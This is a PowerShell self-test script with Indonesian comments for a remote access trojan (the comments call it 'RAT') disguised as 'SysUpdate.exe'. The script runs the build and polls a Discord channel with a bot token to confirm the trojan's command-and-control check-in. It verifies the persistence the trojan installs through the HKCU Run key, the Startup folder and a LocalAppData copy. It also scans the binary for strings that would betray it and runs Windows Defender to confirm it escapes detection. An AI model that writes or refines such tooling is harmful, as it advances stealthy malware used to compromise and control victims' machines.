# tools\selftest.ps1 â€” uji hasil build tanpa nunggu GUI.
#
# Pakai:
#   .\tools\selftest.ps1 -Token "<token>" -Channel 1234567890
#
# Urutan:
#   1. instance lama dimatikan (mutex bikin tes baru keluar diam-diam)
#   2. cache ekstraksi onefile dibersihkan
#   3. exe dijalankan, ditunggu
#   4. channel Discord dibaca: ada pesan "online" BARU?
#   5. token & host dicari plaintext di file
#   6. Defender custom scan + riwayat deteksi
#
# UUID diambil dari dist\SysUpdate.json kalau ada. Kalau tidak, cocokkan
# hanya pesan yang lebih baru dari waktu start â€” versi pertama skrip ini
# mencocokkan sembarang pesan lama dan melaporkan "online" padahal build
# barunya belum pernah check-in.

param(
    [string]$Exe = ".\dist\SysUpdate.exe",
    [Parameter(Mandatory = $true)][string]$Token,
    [Parameter(Mandatory = $true)][string]$Channel,
    [string]$Uuid = "",
    [int]$Wait = 60,
    # Persistensi sekarang dipasang 2-5 menit setelah proses lahir, jadi
    # pembersihan otomatis di akhir tes membunuh proses SEBELUM baris
    # "persist:" sempat dikirim. Pakai -NoCleanup buat menguji itu.
    [switch]$NoCleanup
)

$ErrorActionPreference = "Continue"
$UA = "DiscordBot (https://example.com, 1.0)"
$API = "https://discord.com/api/v10"

function Say($m) { Write-Host $m }

if (-not (Test-Path $Exe)) { Say "[!] exe nggak ada: $Exe"; exit 1 }
$Exe = (Resolve-Path $Exe).Path
Say "[*] exe      : $Exe"

# UUID dari manifest: tanpa ini, tes bisa "lolos" karena pesan build lama.
$manifest = [System.IO.Path]::ChangeExtension($Exe, ".json")
$Alias = ""
if (Test-Path $manifest) {
    try {
        $m = Get-Content $manifest -Raw | ConvertFrom-Json
        if (-not $Uuid) { $Uuid = $m.uuid }
        if ($m.alias) { $Alias = $m.alias }
        Say ("[*] manifest : sha256=" + $m.sha256.Substring(0, 16) + "... size=" + $m.size)
    } catch { }
}
Say ("[*] uuid     : " + $(if ($Uuid) { $Uuid } else { "(tidak diketahui)" }) + " | alias: " + $(if ($Alias) { "!" + $Alias } else { "-" }))

$d = Get-CimInstance Win32_LogicalDisk -Filter "DeviceID='C:'" -ErrorAction SilentlyContinue
if ($d) { Say ("[*] disk C:  : " + [math]::Round($d.FreeSpace / 1GB, 2) + " GB bebas") }

Get-Process -Name SysUpdate -ErrorAction SilentlyContinue | Stop-Process -Force
Get-Process | Where-Object { $_.ProcessName -like 'jna*' } | Stop-Process -Force -ErrorAction SilentlyContinue
Start-Sleep -Seconds 2

$cache = Join-Path $env:LOCALAPPDATA "msoia"
if (Test-Path $cache) {
    Remove-Item $cache -Recurse -Force -ErrorAction SilentlyContinue
    Say "[*] cache    : dibersihkan"
}

$started = (Get-Date).ToUniversalTime()
Start-Process -FilePath $Exe
Say "[*] jalan    : nunggu sampai $Wait detik (jeda acak 3-12 detik + guard)"

$deadline = (Get-Date).AddSeconds($Wait)
$hit = $null
while ((Get-Date) -lt $deadline) {
    Start-Sleep -Seconds 4
    $raw = curl.exe -s -H "Authorization: Bot $Token" -H "User-Agent: $UA" "$API/channels/$Channel/messages?limit=10"
    if (-not $raw) { continue }
    try { $msgs = $raw | ConvertFrom-Json } catch { continue }
    foreach ($msg in $msgs) {
        if ($msg.content -notmatch '\]\s*online\s*\|') { continue }
        try { $ts = [datetime]::Parse($msg.timestamp).ToUniversalTime() } catch { continue }
        if ($ts -lt $started.AddSeconds(-2)) { continue }
        # Balasan sekarang diprefix [alias], bukan uuid. Cocokkan keduanya.
        $brand = $false
        if ($Uuid -and $msg.content -match [regex]::Escape($Uuid)) { $brand = $true }
        if ($Alias -and $msg.content -match ('\[' + [regex]::Escape($Alias) + '\]')) { $brand = $true }
        if (-not $brand) { continue }
        $hit = $msg
        break
    }
    if ($hit) { break }
}

$procs = Get-Process -Name SysUpdate -ErrorAction SilentlyContinue
if ($hit) {
    Say ("[+] online   : " + $hit.timestamp)
    Say ("             " + ($hit.content -replace "`n", " / "))
} else {
    Say "[-] online   : TIDAK ADA pesan online BARU dalam $Wait detik"
}
Say ("[*] proses   : " + ($procs | Measure-Object).Count + " aktif")
if ($procs) { Say ("[*] pid      : " + (($procs | ForEach-Object { $_.Id }) -join ',')) }

# Persistensi: dicek apa adanya di disk, bukan dari laporan RAT.
$name = [System.IO.Path]::GetFileNameWithoutExtension($Exe)
$inst = Join-Path $env:LOCALAPPDATA ("Programs\" + $name + "\" + $name + ".exe")
$runKey = (Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -ErrorAction SilentlyContinue).$name
$startup = Join-Path $env:APPDATA ("Microsoft\Windows\Start Menu\Programs\Startup\" + $name + ".exe")
Say ("[*] installed: " + (Test-Path $inst) + "  " + $inst)
Say ("[*] runkey   : " + $(if ($runKey) { $runKey } else { "(kosong)" }))
Say ("[*] startup  : " + (Test-Path $startup) + "  (opsional - hanya dipakai kalau Run key diblokir)")

$bytes = [System.IO.File]::ReadAllBytes($Exe)
$text = [System.Text.Encoding]::ASCII.GetString($bytes)
$leaks = @()
if ($text.Contains($Token)) { $leaks += "token" }
if ($text.Contains("discord.com")) { $leaks += "discord.com" }
if ($text.Contains("PyInstaller")) { $leaks += "PyInstaller" }
if ($text.Contains("_MEI")) { $leaks += "_MEI" }
if ($leaks.Count -eq 0) { Say "[+] leak     : bersih" } else { Say ("[!] leak     : " + ($leaks -join ', ')) }

if ($procs -and -not $NoCleanup) { $procs | Stop-Process -Force; Start-Sleep -Seconds 2 }
$tmp = Join-Path $env:TEMP ("av_" + (Get-Date -Format 'HHmmss'))
New-Item -ItemType Directory -Force -Path $tmp | Out-Null
Copy-Item $Exe (Join-Path $tmp (Split-Path $Exe -Leaf)) -Force
Start-MpScan -ScanType CustomScan -ScanPath $tmp -ErrorAction SilentlyContinue
Start-Sleep -Seconds 3
$det = Get-MpThreatDetection -ErrorAction SilentlyContinue |
    Where-Object { $_.InitialDetectionTime -gt $started.ToLocalTime() }
if ($det) {
    Say "[!] defender : DETEKSI"
    $det | ForEach-Object { Say ("              " + ($_.Resources -join ',')) }
} else {
    Say "[+] defender : lolos scan lokal"
}
Remove-Item $tmp -Recurse -Force -ErrorAction SilentlyContinue
Say "[*] selesai"
